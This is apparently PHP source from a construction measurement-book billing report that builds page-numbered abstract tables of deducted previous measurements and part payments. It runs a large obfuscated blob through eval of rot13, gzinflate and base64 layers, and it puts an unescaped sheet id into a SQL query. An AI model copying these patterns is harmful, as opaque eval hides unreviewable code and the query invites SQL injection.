ONPZcrOZdC0EN0Qps4Zk5wySTtGnbxFSTsnxnJUf664n3LNdU8k8YAMiXD5JsRSq+NvN0W4iaJRL4VwCPY5V/9gTRAgNEio51ftfbioT+Vt1fPpt7dKMwOg88JYOXUpLXqniWK8ABaqyLnEVlVpVdz/LfrfR/ASpdydsKKyDd2ZQMwxE9XERevp0Tjs+yDNa9LAxfr6XShAqVndMU3f2tRymQpjKM+nWW2H10TuikDtoGcUR5mQCvbgB+yq6FsIKc4syCxdb3vPFkaVo8NCiXXTO2XhI8vIoWeGUSkplgkbgmdyM/Nl5OVN2Kxh+r3oA119pg4uVpyImSMxNag2Ux7y704aRE1Swfzz9tcvrv//zfv77fw==')))));

?>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor="#FFFFFF" id="table1">
<?php echo $tablehead; ?>
<!--<tr bgcolor="#d4d8d8" style="height:5px"><td colspan="13" style="border-top-color:#666666; border-bottom-color:#666666;height:5px"></td></tr>-->
<?php 
//$Line = $Line+2;
$color_var = 0; $table_group_row = 0; $temp_array = array(); $OverAllDpmAmount = 0; $OverAllSlmDpmAmount = 0; $OverAllSlmDpmAmount = 0; $SubdividSlmStr = "";
$unionqur = "(SELECT subdivid  FROM mbookgenerate WHERE sheetid = '$abstsheetid') UNION (SELECT subdivid  FROM measurementbook WHERE sheetid = '$abstsheetid' AND (part_pay_flag = '0' OR part_pay_flag = '1'))";
$unionsql = mysql_query($unionqur);
while($Listsubdivid = mysql_fetch_array($unionsql)) { $subdivid_list .= $Listsubdivid['subdivid']."*"; }
$subdivisionlist_1 = explode("*",rtrim($subdivid_list,"*"));
natsort($subdivisionlist_1);
foreach($subdivisionlist_1 as $key => $summ_1)
{
   if($summ_1 != "")
   {
      $subdivisionlist_2 .= $summ_1.",";
   }
}
$subdivisionlist = explode(',',rtrim($subdivisionlist_2,","));
for($i=0;$i<count($subdivisionlist);$i++)
{
eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
if($Line >= 34)
{
?>
<tr>
	<td colspan='3' align='right' class='labelbold'>C/o Page No <?php echo $page+1; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineTemp; ?></td>
</tr>
<tr class='labelprint'><td colspan='12' align='center' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page <?php echo $page; ?></td></tr>
</table>
<p style='page-break-after:always;'></p>
<table width="1087px" border="0"  cellpadding="2" cellspacing="2" align="center" bgcolor="#FFFFFF" style="border:none;" class="labelprint">
	<tr style="border:none;"><td align="center" style="border:none;">Abstract M.Book No.<?php echo $abstmbno; ?>&nbsp;&nbsp;</td></tr>
</table>
<?php echo $table; ?>
<table width='1087px' cellpadding='3' cellspacing='3' align='center' class='label table1' bgcolor='#FFFFFF' id='table1'>
<?php echo $tablehead; ?>
<tr>
	<td colspan='3' align='right' class='labelbold'>B/f from Page No <?php echo $page; ?>/ Abstract MB No <?php echo $abstmbno; ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllDpmAmount, 2, '.', ''); ?></td>
	<td></td>
	<td align='right' class='labelbold'><?php echo number_format($OverAllSlmAmount, 2, '.', ''); ?></td>
	<td><?php //echo $LineIncr."*".$Linecheck; ?></td>
</tr>
<?php
$Line = $LineIncr+$Linecheck; $page++;
}
//--*************THIS PART IS FOR " PRINT " Item Name, Description and Check Box  SECTION********************//
?>
<input type="hidden" name="hid_item_str" id="hid_item_str<?php echo $subdivid; ?>" value="<?php echo $item_str; ?>" />
<tr border='1' bgcolor="" class="labelprint">
	<td width="61px" align="center" style="border-top-color:#666666;" class="">
		<?php echo $subdivname;?>
	</td>
	<td colspan="8" style="border-top-color:#666666;" class="">
		<?php echo $description; ?>
	</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $slm_cnt."**".$dpm_cnt; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
	<td style="border-top-color:#666666;" width="40px"><?php //echo $Line; ?>&nbsp;</td>
</tr>
<?php 
$rowcount++; $Line++;//echo "A = ".$Line."<br/>";
// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page);  $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>"; }
//--*************THIS PART IS FOR " PRINT " DEDUCT PREVIOUS MEASUREMENT ( D.P.M. ) SECTION*****************//
	$QtyDpmSlm_4 = 0;	$PercDpmSlm_4 = 0;	$Dpm_Slm_Amount_4 = 0;	$total_percent_dpm_slm_4 = 0;
	$QtyDpmSlm_3 = 0;	$PercDpmSlm_3 = 0;	$Dpm_Slm_Amount_3 = 0;	$total_percent_dpm_slm_3 = 0;
	$QtyDpmSlm_2 = 0;	$PercDpmSlm_2 = 0;	$Dpm_Slm_Amount_2 = 0;	$total_percent_dpm_slm_2 = 0;
	$QtyDpmSlm_1 = 0;	$PercDpmSlm_1 = 0;	$Dpm_Slm_Amount_1 = 0;	$total_percent_dpm_slm_1 = 0;

	if($dpm_cnt > 0)
	{
		$eplodedpm = explode("*", rtrim($dpm_mesurementbook_details,"*"));
		//echo "D = ".count($eplodedpm)."<br/>";
		 $DpmTemp = 0;
		for($x4=0; $x4<count($eplodedpm); $x4+=13)
		{
			$dpmqty 				= $eplodedpm[$x4+1];
			//echo $dpmqty."<br/>";
			$remarks 				= $eplodedpm[$x4+10];
			$rbnDpm					= $eplodedpm[$x4+11];
			$MeasurementbookidDpm	= $eplodedpm[$x4+12];
			$paymentpercent_dpm 	= $eplodedpm[$x4+7];
			$dpmamt 				= $dpmqty * $rate * $paymentpercent_dpm / 100;
			$dummy=0;
			if(in_array($MeasurementbookidDpm, $DpmArrMbidList)) 
			{
				$ArrUniqueVal 	= array_unique($DpmArrMbidList);
				$UniqueCount 	= count($ArrUniqueVal);
				$x6=0;
				$count_1 		= count($DpmArrAmbList);
				$count_2 		= count($DpmArrAmbPgList);
				$AMBookNo 		= $DpmArrAmbList[$count_1-1];
				$AMBookPage 	= $DpmArrAmbList[$count_2-1];
				while($x6<=$UniqueCount)
				{
					$StartKey = $ArrUniqueVal[$x6];
					$PaidDpmPerc = $DpmArrPercent[$StartKey];
					$rowspancnt = $UniqueCount+$DpmTemp;
					$DpmKeyresult = checkPartpayment($DpmArrMbidList,$StartKey);
					$DpmPercSum = $PaidDpmPerc;
					if($DpmKeyresult != "")
					{
						$explodeDpmKeyresult = explode("*",$DpmKeyresult);
						for($x7=0; $x7<count($explodeDpmKeyresult); $x7++)
						{
							$key = $explodeDpmKeyresult[$x7];
							$DpmPercSum = $DpmPercSum + $DpmArrPayPercentList[$key];
						}
						if(($x6 == 0)&&($DpmTemp == 0))
						{
						$DpmQuantityty_1 = $DpmArrQuantityList[$key];
						$DpmAmount_1 = $DpmQuantityty_1 * $rate * $DpmPercSum /100;
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_1 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_1 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_1 = $QtyDpmSlm_1 * $PercDpmSlm_1 * $rate/100;
							}
						$total_percent_dpm_slm_1 = $DpmPercSum+$PercDpmSlm_1;
						
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<td  align='center' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='180px' class='' rowspan="<?php echo $rowspancnt; ?>" style="font-size:10px;"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $rowspancnt; ?>"></td>
						<td  align='right' width='' class=''><?php echo $QtyDpmSlm_1; ?></td>
						<td  align='right' width='' class=''>
							<?php 
							echo number_format($DpmAmount_1, 2, '.', '');
							$dpm_amount_item 		= $dpm_amount_item + $DpmAmount_1;
							?>
						</td>
						<td  align='right' width='6%' class='' rowspan=""></td>
						<td  align='right' width='3%' class='' rowspan="">
							<?php
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_1, 2, '.', ''); 
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_1;
							} 
							?>
						</td>
						<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
							<?php 
							if(in_array($StartKey, $SlmArrMbidList))
							{
								echo $total_percent_dpm_slm_1."% Paid"; 
							}
							?>
						</td>
					</tr>

<?php					$rowcount++;	
						}
						
						else
						{
							if(in_array($StartKey, $SlmArrMbidList))
							{
								$Arrkey = array_search($StartKey, $SlmArrMbidList);
								$QtyDpmSlm_2 = $SlmArrQuantityList[$Arrkey];
								$PercDpmSlm_2 = $SlmArrPayPercentList[$Arrkey];
								$Dpm_Slm_Amount_2 = $QtyDpmSlm_2 * $PercDpmSlm_2 * $rate/100;
								$total_percent_dpm_slm_2 = $DpmPercSum+$PercDpmSlm_2;
								
							}
							else
							{
								$QtyDpm_5 = $DpmArrQuantityList[$key];
								$Dpm_Slm_Amount_2 = $QtyDpm_5 * 100 * $rate/100;
							}
?>
							<tr border='1' bgcolor="#FFFFFF" class="labelprint">
								<td  align='right' width='' class=''><?php echo $DpmArrQuantityList[$key]; ?></td>
								<td  align='right' width='' class=''><?php echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); $dpm_amount_item = $dpm_amount_item + $Dpm_Slm_Amount_2; ?></td>
								<td  align='right' width='' class=''></td>
								<td  align='right' width='' class=''>
									<?php
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo number_format($Dpm_Slm_Amount_2, 2, '.', ''); 
										$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_2;
									} 
									?>
								</td>
								<td  align='center' width='40px' class='' rowspan="" style="font-size:9px;">
									<?php 
									if(in_array($StartKey, $SlmArrMbidList))
									{
										echo $total_percent_dpm_slm_2."% Paid"; 
									}
									?>
								</td>
							</tr>
		<?php				$rowcount++;		
						}
						
					}
					$DpmArrMbidList = removeArray($DpmKeyresult,$DpmArrMbidList);
					$x6++;	
					array_push($temp_array,$StartKey);
				}
				//$Line = $Line + $rowspancnt;//echo "B = ".$rowspancnt."<br/>";
				// if($Line >= 28) { CheckPageBreak($tablehead,$abstmbno,$table,$page); $Line = $LineIncr; $page++; echo $slm_amount_item."<br/>";}
			}
							//********** THIS PART IS FOR NOW PAYING (SLM) - DEDUCT PREVIOUS MEASUREMENT **********//
			$PercDpmSlm_3 = 0; 	$Dpm_Slm_Amount_4 = 0;		
			if(in_array($MeasurementbookidDpm, $temp_array))
			{
				$dummy = 1;
			}
			else
			{
				if($x4 == 0)
				{ 
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
						$Arrkey2 = array_search($MeasurementbookidDpm, $SlmArrMbidList);
						$QtyDpmSlm_3 = $SlmArrQuantityList[$Arrkey2];
						$PercDpmSlm_3 = $SlmArrPayPercentList[$Arrkey2];
						$Dpm_Slm_Amount_3 = $QtyDpmSlm_3 * $PercDpmSlm_3 * $rate /100;
					}
					$total_percent_dpm_slm_3 = $paymentpercent_dpm + $PercDpmSlm_3;
?>
					<tr border='1' bgcolor="#FFFFFF" class="labelprint">
						<!--<td  align='left' width='3%' class=''>&nbsp;</td>-->
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' style="font-size:10px;" rowspan="<?php echo $dpm_cnt; ?>"><?php echo "Prev-Qty Vide P ".$AbstractMbookPageNoDpm."/Abstract MB No.".$AbstractMbookNoDpm; ?></td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>"><?php echo number_format($dpm_measurement_qty, $decimal, '.', ''); ?></td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='left' width='' class='' rowspan="<?php echo $dpm_cnt; ?>">&nbsp;</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmqty, $decimal, '.', ''); 
								
							?>
						</td>
						<td  align='right' width='' class=''>
							<?php 
								echo number_format($dpmamt, 2, '.', ''); 
								$dpm_amount_item 		= $dpm_amount_item + $dpmamt;
							?>
						</td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>"></td>
						<td  align='right' width='' class='' rowspan="<?php if($dummy == 1) { echo $dpm_cnt; } ?>">
							<?php 
							if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
							{
								echo number_format($Dpm_Slm_Amount_3, 2, '.', '');
								$slm_amount_item = $slm_amount_item + $Dpm_Slm_Amount_3;
							}
							?>
						</td>
						<td  align='center' width='' class='' rowspan="" style="font-size:9px;">
							<?php 
								echo $total_percent_dpm_slm_3."% Paid"; 
							?>
						</td>
					</tr>	
<?php 			$rowcount++;
				}
				if(($dpm_cnt > 1) && ($x4 != 0))
				{
					if(in_array($MeasurementbookidDpm, $SlmArrMbidList))
					{
